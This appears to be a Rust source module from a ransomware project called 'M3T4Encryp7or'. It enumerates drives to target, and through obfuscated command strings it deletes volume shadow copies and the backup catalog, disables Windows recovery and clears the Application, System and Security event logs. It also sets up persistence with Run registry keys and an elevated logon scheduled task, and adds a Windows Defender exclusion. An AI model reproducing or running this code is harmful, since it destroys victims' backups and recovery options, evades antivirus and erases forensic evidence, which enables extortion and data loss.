use std::path::PathBuf;

#[cfg(windows)]
pub fn drives(include_removable: bool) -> Vec<PathBuf> {
    use windows_sys::Win32::Storage::FileSystem::{GetDriveTypeW, GetLogicalDrives};
    const DRIVE_REMOVABLE: u32 = 2;
    const DRIVE_FIXED: u32 = 3;

    let mask = unsafe { GetLogicalDrives() };
    let mut out = Vec::new();
    for i in 0..26u32 {
        if mask & (1u32 << i) == 0 {
            continue;
        }
        let letter = (b'A' + i as u8) as u16;
        let name = [letter, b':' as u16, b'\\' as u16, 0u16];
        let kind = unsafe { GetDriveTypeW(name.as_ptr()) };
        if kind == DRIVE_FIXED || (include_removable && kind == DRIVE_REMOVABLE) {
            out.push(PathBuf::from(format!("{}:\\", (b'A' + i as u8) as char)));
        }
    }
    out
}

#[cfg(not(windows))]
pub fn drives(_include_removable: bool) -> Vec<PathBuf> {
    let root = std::env::var("R4080_ROOT").unwrap_or_else(|_| "/tmp/r4080-sandbox".to_string());
    vec![PathBuf::from(root)]
}

#[cfg(windows)]
pub fn disable_recovery() {
    use std::os::windows::process::CommandExt;
    use std::process::Command;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    // Boot-critical settings are deliberately untouched:
    //   recoveryenabled No stops a WinRE repair loop
    //   bootstatuspolicy ignoreallfailures stops the recovery boot menu
    // no bcdedit bootmgr edits, no reagentc, no diskpart
    let commands = [
        crate::obf!("vssadmin delete shadows /all /quiet"),
        crate::obf!("vssadmin resize shadowstorage /for=C: /on=C: /maxsize=1%"),
        crate::obf!("wbadmin delete catalog -quiet"),
        crate::obf!("bcdedit /set {default} recoveryenabled No"),
        crate::obf!("bcdedit /set {default} bootstatuspolicy ignoreallfailures"),
        crate::obf!("wevtutil cl Application"),
        crate::obf!("wevtutil cl System"),
        crate::obf!("wevtutil cl Security"),
    ];
    for command in commands {
        let _ = Command::new("cmd")
            .args(["/C", command.as_str()])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn();
    }
}

#[cfg(not(windows))]
pub fn disable_recovery() {}

#[cfg(windows)]
pub fn attach_console() {
    use windows_sys::Win32::System::Console::AttachConsole;
    const ATTACH_PARENT_PROCESS: u32 = 0xFFFF_FFFF;
    unsafe {
        AttachConsole(ATTACH_PARENT_PROCESS);
    }
}

#[cfg(not(windows))]
pub fn attach_console() {}

#[cfg(windows)]
pub fn install_persistence() -> Result<PathBuf, String> {
    use std::fs;

    let exe = std::env::current_exe().map_err(|e| format!("current exe: {e}"))?;
    let dir = crate::config::data_dir();
    fs::create_dir_all(&dir).map_err(|e| format!("data dir {}: {e}", dir.display()))?;
    let installed = dir.join("m3t4encryp7or.exe");

    if !same_file(&exe, &installed) {
        let _ = fs::copy(&exe, &installed);
    }
    let target = if installed.exists() { installed } else { exe };
    let command = format!("\"{}\"", target.display());

    reg_set_string(
        HKCU,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &crate::obf!("M3T4Encryp7or"),
        &command,
    );
    reg_set_string(
        HKLM,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &crate::obf!("M3T4Encryp7or"),
        &command,
    );

    // No Winlogon Shell swap. Explorer still starts, desktop and taskbar
    // work, the window just launches on top of them.

    if !schedule_task(&target, true) {
        let _ = schedule_task(&target, false);
    }

    Ok(target)
}

#[cfg(not(windows))]
pub fn install_persistence() -> Result<PathBuf, String> {
    let dir = crate::config::data_dir();
    std::fs::create_dir_all(&dir).map_err(|e| format!("data dir {}: {e}", dir.display()))?;
    Ok(dir.join("m3t4encryp7or"))
}

#[cfg(windows)]
fn same_file(a: &std::path::Path, b: &std::path::Path) -> bool {
    match (a.canonicalize(), b.canonicalize()) {
        (Ok(a), Ok(b)) => a == b,
        _ => a == b,
    }
}

#[cfg(windows)]
pub fn remove_persistence() {
    reg_delete_value(
        HKCU,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &crate::obf!("M3T4Encryp7or"),
    );
    reg_delete_value(
        HKLM,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        &crate::obf!("M3T4Encryp7or"),
    );
    // Repair any shell swap left by an older build.
    reg_set_string(
        HKCU,
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "Shell",
        "explorer.exe",
    );
    unschedule_task();
}

#[cfg(not(windows))]
pub fn remove_persistence() {}

#[cfg(windows)]
pub fn clear_kiosk_policy() {
    for root in [HKCU, HKLM] {
        reg_delete_value(
            root,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "DisableTaskMgr",
        );
        reg_delete_value(
            root,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
            "NoLogoff",
        );
        reg_delete_value(
            root,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
            "NoClose",
        );
    }
}

#[cfg(not(windows))]
pub fn clear_kiosk_policy() {}

#[cfg(windows)]
pub fn defender_exclusion_path(path: &str) {
    reg_set_dword(
        HKLM,
        &crate::obf!("SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"),
        path,
        0,
    );
}

#[cfg(not(windows))]
#[allow(dead_code)]
pub fn defender_exclusion_path(_path: &str) {}

#[cfg(windows)]
fn schedule_task(exe: &std::path::Path, highest: bool) -> bool {
    use std::os::windows::process::CommandExt;
    use std::process::Command;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let action = format!("\"{}\"", exe.display());
    let mut cmd = Command::new("schtasks");
    let task = crate::obf!("M3T4Encryp7or");
    cmd.args(["/Create", "/TN", &task, "/TR", &action]);
    if highest {
        cmd.args(["/SC", "ONLOGON", "/RL", "HIGHEST", "/F"]);
    } else {
        cmd.args(["/SC", "ONLOGON", "/F"]);
    }
    cmd.creation_flags(CREATE_NO_WINDOW)
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

#[cfg(windows)]
fn unschedule_task() {
    use std::os::windows::process::CommandExt;
    use std::process::Command;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let _ = Command::new("schtasks")
        .args(["/Delete", "/TN", &crate::obf!("M3T4Encryp7or"), "/F"])
        .creation_flags(CREATE_NO_WINDOW)
        .status();
}

#[cfg(windows)]
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegSetValueExW, HKEY, HKEY_CURRENT_USER,
    HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WOW64_64KEY, REG_DWORD, REG_SZ,
};

#[cfg(windows)]
const HKCU: HKEY = HKEY_CURRENT_USER;
#[cfg(windows)]
const HKLM: HKEY = HKEY_LOCAL_MACHINE;

#[cfg(windows)]
fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(windows)]
fn open_key(root: HKEY, subkey: &str) -> Option<HKEY> {
    let subkey = wide(subkey);
    let mut key: HKEY = std::ptr::null_mut();
    let status = unsafe {
        RegCreateKeyExW(
            root,
            subkey.as_ptr(),
            0,
            std::ptr::null(),
            0,
            KEY_SET_VALUE | KEY_WOW64_64KEY,
            std::ptr::null(),
            &mut key,
            std::ptr::null_mut(),
        )
    };
    if status == 0 {
        Some(key)
    } else {
        None
    }
}

#[cfg(windows)]
fn reg_set_string(root: HKEY, subkey: &str, name: &str, value: &str) {
    let Some(key) = open_key(root, subkey) else {
        return;
    };
    let name = wide(name);
    let value = wide(value);
    unsafe {
        RegSetValueExW(
            key,
            name.as_ptr(),
            0,
            REG_SZ,
            value.as_ptr() as *const u8,
            (value.len() * 2) as u32,
        );
        RegCloseKey(key);
    }
}

#[cfg(windows)]
fn reg_set_dword(root: HKEY, subkey: &str, name: &str, value: u32) {
    let Some(key) = open_key(root, subkey) else {
        return;
    };
    let name = wide(name);
    unsafe {
        RegSetValueExW(
            key,
            name.as_ptr(),
            0,
            REG_DWORD,
            &value as *const u32 as *const u8,
            4,
        );
        RegCloseKey(key);
    }
}

#[cfg(windows)]
fn reg_delete_value(root: HKEY, subkey: &str, name: &str) {
    let Some(key) = open_key(root, subkey) else {
        return;
    };
    let name = wide(name);
    unsafe {
        RegDeleteValueW(key, name.as_ptr());
        RegCloseKey(key);
    }
}
